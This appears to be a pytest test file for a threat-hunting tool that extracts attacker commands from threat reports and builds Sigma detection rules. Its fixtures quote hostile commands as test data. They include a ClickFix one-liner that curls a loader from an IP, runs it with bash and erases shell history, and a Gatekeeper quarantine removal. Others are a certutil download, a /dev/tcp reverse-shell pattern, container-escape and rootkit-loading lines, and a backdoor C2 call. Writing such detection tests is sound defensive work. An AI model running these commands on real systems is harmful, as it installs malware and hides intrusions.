"""Process rules from commands the source shows being run."""

from typing import Any, Dict, List

import pytest

from hecate_agent.agents.llm.sigma_generator import SigmaGenerationInput, SigmaGeneratorAgent
from hecate_agent.core.command_rules import command_candidates, observed_commands

#: The Huntress ClickFix report's commands, as page extraction returns them.
HUNTRESS = """
When the page opened, the ClickFix popup appeared and instructed them to run the command shown below.
export SRC_URL='https://profitnow[.]io/' && (cd /tmp && curl -kfsSL "http://193.29.224[.]151/92392991a0cca55?force=1" -o .UlaccK
&& bash .UlaccK && rm -f .UlaccK) > /dev/null 2>&1 & clear; printf '\\033[3J'; history -d $(history 1 2>/dev/null | awk '{print $1}') 2>/dev/null; fc -p /dev/null 2>/dev/null;
The key commands executed by this "profiler/loader" component are as follows, in sequential order:
ioreg -c IOPlatformExpertDevice -d 2
: Provides details about the hardware the target uses.
curl -kFsSL [payload URL] -o [random filename]
: Downloads the Mach-O malware executable.
xattr -d com.apple.quarantine
$HOME/Library/Caches/com.apple.trustd/com.apple.verified
: Removes the Gatekeeper bit.
The payload was incorporated into BTM via
launchctl bootstrap gui/501 /Users/m1/Library/LaunchAgents/com.apple.softwareupdated.plist
.
The attackers also prompted the victim for their credentials via an osascript dialogue.
In this case, that command pulled down a Bash profiler/loader that collected system details.
Our platform combines security awareness training and a 24/7 SOC.
"""


def _selections(text: str, platforms: List[str]) -> Dict[str, str]:
    return {
        c["detection"]["selection"]["Image|endswith"]: c["detection"]["selection"]["CommandLine|contains"]
        for c in command_candidates(text, platforms)
    }


def test_the_reports_commands_become_program_and_argument_pairs() -> None:
    assert _selections(HUNTRESS, ["macOS"]) == {
        "/curl": "http://193.29.224.151/92392991a0cca55?force=1",
        "/bash": ".UlaccK",
        "/xattr": "-d com.apple.quarantine",
        "/launchctl": "bootstrap",
        "/rm": "-f .UlaccK",
        "/ioreg": "-c IOPlatformExpertDevice",
    }


def test_builtins_placeholders_and_prose_are_not_commands() -> None:
    """history and fc run inside the shell and start no process; "[payload URL]" is the report's
    placeholder; "Bash profiler/loader", "osascript dialogue" and "security awareness" are prose."""
    selections = _selections(HUNTRESS, ["macOS"])
    assert not {"/history", "/fc", "/osascript", "/security"} & set(selections)
    assert "[payload URL]" not in str(selections)


def test_elided_and_placeholder_arguments_are_excluded() -> None:
    text = "The adversary executed curl http(s)://... to stage payloads and bash /dev/tcp/<ip>/<port> for reverse shells."
    candidates = command_candidates(text, ["Linux"])
    for c in candidates:
        cmd_arg = c["detection"]["selection"]["CommandLine|contains"]
        assert "..." not in cmd_arg
        assert "<ip>" not in cmd_arg
        assert "http(s)" not in cmd_arg


def test_a_capability_sentence_is_not_a_command_that_ran() -> None:
    text = "The toolkit can run xattr -d com.apple.quarantine on any file it downloads."
    assert command_candidates(text, ["macOS"]) == []


def test_windows_commands_on_a_windows_hunt_only() -> None:
    text = "The operator ran certutil -urlcache -split -f http://203.0.113.9/a.exe C:\\\\Users\\\\Public\\\\a.exe."
    # The first non-flag argument: the URL says more than the -urlcache flag does.
    assert _selections(text, ["Windows"]) == {"\\certutil.exe": "-f http://203.0.113.9/a.exe"}
    assert command_candidates(text, ["macOS"]) == []


def test_the_vshell_prose_yields_no_command() -> None:
    """ "launching cmd.exe and then Word" names a program; it is not a command line."""
    assert command_candidates("The resume executable was seen launching cmd.exe and then Word.", ["Windows"]) == []


def _input(commands: List[Dict[str, Any]]) -> SigmaGenerationInput:
    return SigmaGenerationInput(hypothesis="x", platforms=["macOS"], hunt_id="H-0001", observed_commands=commands)


def test_every_candidate_becomes_a_deterministic_rule_through_the_semantic_gate() -> None:
    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    built = agent._command_rules(_input(command_candidates(HUNTRESS, ["macOS"])))
    assert built and all(problem is None for _, problem in built)
    xattr = next(rule for rule, _ in built if rule and "xattr" in rule.title)
    assert xattr.origin == "deterministic" and "xattr -d com.apple.quarantine" in xattr.rule_yaml


@pytest.mark.parametrize("program", ["ioreg", "system_profiler"])
def test_discovery_commands_are_low_level_leads(program: str) -> None:
    candidate = next(
        c
        for c in command_candidates(HUNTRESS + " system_profiler SPHardwareDataType\n", ["macOS"])
        if c["title"].startswith(program)
    )
    assert candidate["level"] == "low"


def test_a_flag_is_not_joined_to_a_path_whose_variable_was_stripped() -> None:
    """mkdir -p "$HOME/Library/x" runs as "-p /Users/me/Library/x": "-p /Library/x" never occurs."""
    text = 'The loader then ran mkdir -p "$HOME/Library/Caches/com.apple.trustd" on the Mac.'
    (command,) = observed_commands(text, ["macOS"])
    assert command.argument == "/Library/Caches/com.apple.trustd"


def test_schtasks_task_creation_generates_process_and_file_rules() -> None:
    text = 'Scheduled task creation: schtasks /create /sc minute /mo 15 /tn "UpdateCheck"'
    (cmd,) = observed_commands(text, ["Windows"])
    assert cmd.program == "schtasks"
    assert cmd.argument == "UpdateCheck"
    candidates = command_candidates(text, ["Windows"])
    assert len(candidates) == 2
    proc = next(c for c in candidates if c["category"] == "process_creation")
    assert proc["detection"]["selection"] == {
        "Image|endswith": "\\schtasks.exe",
        "CommandLine|contains|all": ["/create", "UpdateCheck"],
    }
    file_evt = next(c for c in candidates if c["category"] == "file_event")
    assert file_evt["detection"]["selection"] == {
        "TargetFilename|contains": "\\Tasks\\UpdateCheck",
    }
    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    input_data = SigmaGenerationInput(hypothesis="x", platforms=["Windows"], hunt_id="H-0002", observed_commands=candidates)
    built = agent._command_rules(input_data)
    assert len(built) == 2
    assert all(problem is None for _, problem in built)
    categories = {rule.logsource_category for rule, _ in built if rule}
    assert categories == {"process_creation", "file_event"}


def test_linux_markers_fallback_includes_unix_on_windows_hunt() -> None:
    text = (
        "Adversaries obtained initial access and executed nsenter -t 1 -m -u -i -n -p /bin/bash "
        "to escape container namespaces. They subsequently executed bpftool prog load /tmp/.kprobe_filter.o "
        "to deploy an eBPF stealth rootkit."
    )
    # platforms only specifies Windows, but text contains Linux markers
    cmds = observed_commands(text, platforms=["Windows"])
    progs = {c.program for c in cmds}
    assert "nsenter" in progs
    assert "bpftool" in progs

    candidates = command_candidates(text, platforms=["Windows"])
    nsenter_cand = next(c for c in candidates if "nsenter" in c["title"])
    assert nsenter_cand["platform"] == "unix"
    assert nsenter_cand["detection"]["selection"]["Image|endswith"] == "/nsenter"

    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    input_data = SigmaGenerationInput(
        hypothesis="Container escape to Linux host",
        platforms=["Windows"],
        hunt_id="H-0833",
        observed_commands=candidates,
    )
    built = agent._command_rules(input_data)
    assert len(built) >= 2
    import yaml

    for rule, prob in built:
        assert prob is None
        assert rule is not None
        doc = yaml.safe_load(rule.rule_yaml)
        if "/nsenter" in rule.rule_yaml or "/bpftool" in rule.rule_yaml:
            assert doc["logsource"]["product"] == "linux"


def test_lab_harness_and_setup_commands_are_filtered() -> None:
    """docker compose up, localhost health checks, and test harnesses must not become rules."""
    text = (
        "Adversaries exploited the target. Setup the environment using docker compose up -d "
        "and test with curl -s localhost:8010/__lab/status. Then adversary executed "
        "curl http://193.29.224.151/payload.bin -o /tmp/loader and bash /tmp/loader."
    )
    cmds = observed_commands(text, platforms=["Linux"])
    cmd_lines = [c.command for c in cmds]
    # Lab harness commands are stripped
    assert not any("docker" in cl for cl in cmd_lines)
    assert not any("localhost" in cl for cl in cmd_lines)
    assert not any("__lab" in cl for cl in cmd_lines)

    # Legitimate malicious actions remain
    assert any("193.29.224.151" in cl for cl in cmd_lines)
    assert any("bash" in cl for cl in cmd_lines)


def test_unittest_and_benchmarks_are_filtered() -> None:
    """python3 -m unittest, benchmark scripts, and test verifiers must not become rules."""
    text = (
        "Run unit tests: python3 -m unittest discover -s tests -v. "
        "Run benchmarks: ./scripts/reproduce-benchmark.sh. "
        "Verify sandbox: ./bin/kshield verify-sandbox --iterations 100000. "
        "Attacker ran: python3 /tmp/backdoor.py --c2 10.0.0.1."
    )
    cmds = observed_commands(text, platforms=["Linux"])
    cmd_lines = [c.command for c in cmds]
    assert not any("unittest" in cl for cl in cmd_lines)
    assert not any("benchmark" in cl for cl in cmd_lines)
    assert not any("verify-sandbox" in cl for cl in cmd_lines)
    assert any("backdoor.py" in cl for cl in cmd_lines)


def test_documented_reference_candidates_keep_exact_request_and_reference_wording() -> None:
    import yaml

    candidate = {"category": "webserver", "title": "Nuclei reference request: PATCH /api/probe", "command": "PATCH /api/probe",
                 "detection": {"selection": {"cs-method": "PATCH", "cs-uri-stem": "/api/probe"}, "condition": "selection"},
                 "behaviour": "PATCH /api/probe", "passage": "Documented probe request: PATCH /api/probe"}
    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    data = SigmaGenerationInput(hypothesis="Look for documented exploit probes", reference_candidates=[candidate], references=["https://example.com/pinned-template"])
    [(rule, problem)] = agent._command_rules(data)
    assert problem is None and rule is not None
    document = yaml.safe_load(rule.rule_yaml)
    assert document["logsource"]["category"] == "webserver"
    assert document["detection"] == candidate["detection"]
    assert "not evidence of an observed intrusion" in document["description"]
    assert "shows this command being run" not in document["description"]
    assert candidate["passage"] in agent._source_passages(data)


def test_a_reference_candidate_keeps_its_own_falsepositives_and_level() -> None:
    import yaml

    candidate = {"category": "webserver", "title": "Hunting lead: POST /flows as the PoC README documents",
                 "command": "POST /flows", "level": "low",
                 "falsepositives": "Legitimate clients of the product send POST /flows too",
                 "detection": {"selection": {"cs-method": "POST", "cs-uri-stem": "/flows"}, "condition": "selection"}}
    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    [(rule, problem)] = agent._command_rules(SigmaGenerationInput(hypothesis="Reference probe", reference_candidates=[candidate]))
    assert rule and not problem
    document = yaml.safe_load(rule.rule_yaml)
    assert document["level"] == "low"
    assert document["falsepositives"] == ["Legitimate clients of the product send POST /flows too"]


def test_reference_web_rule_transpiles_to_real_ecs_fields_and_fails_closed_without_http_tables() -> None:
    from hecate_agent.core.sigma_transpiler import SigmaTranspiler

    candidate = {"category": "webserver", "title": "Documented Nuclei request", "command": "PATCH /api/probe?x=1",
                 "detection": {"selection": {"cs-method": "PATCH", "cs-uri-stem": "/api/probe", "cs-uri-query": "x=1"}, "condition": "selection"}}
    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    [(rule, problem)] = agent._command_rules(SigmaGenerationInput(hypothesis="Reference probe", reference_candidates=[candidate]))
    assert rule and not problem
    results = SigmaTranspiler().transpile(rule.rule_yaml)
    assert results[SigmaTranspiler.TARGET_SPLUNK].success
    elastic = results[SigmaTranspiler.TARGET_ELASTIC]
    assert elastic.success
    assert 'http.request.method' in elastic.query and 'url.path' in elastic.query and 'url.query' in elastic.query
    assert 'cs-method' not in elastic.query
    mde = results[SigmaTranspiler.TARGET_MDE]
    assert not mde.success and "explicit deployed table and field mapping" in mde.error_message


_POC_README = """# CVE-2026-58115: Node-RED unauthenticated root RCE

## Usage

```bash
python3 poc.py --target http://device:1880 --cmd id
```

## Lab setup

Downloads npm-shrinkwrap.json and builds the image.

## Mitigations

Enable `adminAuth` in settings.js.

## Detection rules

An unauthenticated `POST /flows` deploys an exec node.

## verify.py output

/tmp/suricata-test/fast.log
"""


def test_a_poc_readme_loses_its_operator_sections_for_commands() -> None:
    """H-0018 drafted rules for the tester's own poc.py and lab build."""
    from hecate_agent.core.command_rules import without_operator_sections

    kept = without_operator_sections(_POC_README)
    assert "poc.py" not in kept and "npm-shrinkwrap" not in kept
    assert "adminAuth" not in kept and "POST /flows" not in kept
    assert "Node-RED unauthenticated root RCE" in kept
    assert "fast.log" in kept  # "verify.py output" is not a "verify" section


def test_a_poc_readme_keeps_its_detection_advice_for_artifacts() -> None:
    from hecate_agent.core.command_rules import without_tooling_sections

    kept = without_tooling_sections(_POC_README)
    assert "poc.py" not in kept and "npm-shrinkwrap" not in kept
    assert "POST /flows" in kept and "adminAuth" in kept


def test_a_docker_word_that_is_not_a_subcommand_is_not_a_command() -> None:
    """H-0018: "docker lab 6ES7647-0BA00-1YA2" from a README's lab table."""
    from hecate_agent.core.command_rules import _command_shaped

    assert not _command_shaped("docker", "docker", ["lab", "6ES7647-0BA00-1YA2"])
    assert _command_shaped("docker", "docker", ["run", "--privileged", "alpine"])
